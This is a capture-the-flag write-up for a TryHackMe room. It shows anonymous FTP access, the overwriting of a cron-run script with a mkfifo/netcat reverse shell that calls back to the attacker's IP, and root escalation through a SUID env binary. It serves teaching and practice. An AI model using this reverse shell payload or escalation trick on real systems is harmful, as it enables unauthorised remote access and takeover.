```
So no http but we can see samba and an anonymous ftp port, which has an interesting folder that is writeable!

## nikto
So nothing showing as HTTP after full port scan. No details.

## gobuster
So nothing showing as HTTP after full port scan. No details.

## smbmap
After the nmap scan we can see that we have a samba server running. Lets see what we can gain.
```
~/CTF/tryhackme/anonymous$ smbmap -H $IP

Right lets see what images we have by downloading them.
```

## images

2. Steghide - nothing
2. Stegsolve - nothing
2. Exiftools - nothing
2. Strings - nothing
2. Stegcraker - nothing

## ftp

We also know that the ftp allows anonymous access. What can we get from that?
```
~/CTF/tryhackme/anonymous$ ftp $IP

ftp> 

```
So we have three files:
1. clean.sh
1. removed_files.log
1. to_do.txt

### to-do.txt
```
~/CTF/tryhackme/anonymous$ cat to_do.txt 
I really need to disable the anonymous login...it's really not safe
```
### clean.sh
```
~/CTF/tryhackme/anonymous$ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
### removed_files.log
```
~/CTF/tryhackme/anonymous$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```
So it looks like we have some comments about anonymous logins being dangerous, a bash cleaning file that then looks to update the removed files log. More likely a cronjob.

If we remember the comments about a writeable file:
```
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
```
Lets check out if we can set up a reverse bash shell if we can amend/overwrite the clean file.

```
/CTF/tryhackme/anonymous$ cat clean.sh 
#!/bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.12.213 4445 >/tmp/f
```
Right, on our ftp server, lets transfer that from our directory to theirs. First change to the scripts directory.

```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1806 Sep 07 19:17 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```
Now upload our file.
```
ftp> put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
91 bytes sent in 0.00 secs (334.0872 kB/s)
```
All we need to do now is set up a netcat on our IP and port 4445. #boom
```
/CTF/tryhackme/anonymous$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.9.12.213] from (UNKNOWN) [10.10.82.178] 40404
/bin/sh: 0: can't access tty; job control turned off
```
Using - python -c 'import pty;pty.spawn("/bin/bash")'- to get a better working shell, we can now search for the user flag. Lets all check if we can see if we have sudo permissions for any files or commands.
```
$ python -c 'import pty;pty.spawn("/bin/bash")'
namelessone@anonymous:~$ ls
ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt	
cat user.txt
<insert-user-flag-here>
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ sudo -l
sudo -l
[sudo] password for namelessone: 
```
So we need a password for sudo -l. Lets checkout the SUID files instead.
```
namelessone@anonymous:~$ find / -perm -4000 2>/dev/null

So looking through the files I can see /usr/bin/env which is normally ensures python makes sure that your scripts run inside of a virtual environment. Checking on GTFObins we see that we can escalate privilage if open a shell with the SUID permissions (-p) which in this case is root. 

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
<insert-root-flag-here>
# 
```

Another really great CTF that I enjoyed.

Once again following a methodical planned approach helped me to get the flags.

This room was created by [NamelessOne](https://tryhackme.com/p/Nameless0ne) and one I really enjoyed.

Thanks NamelessOne, looking forward to your next. :)
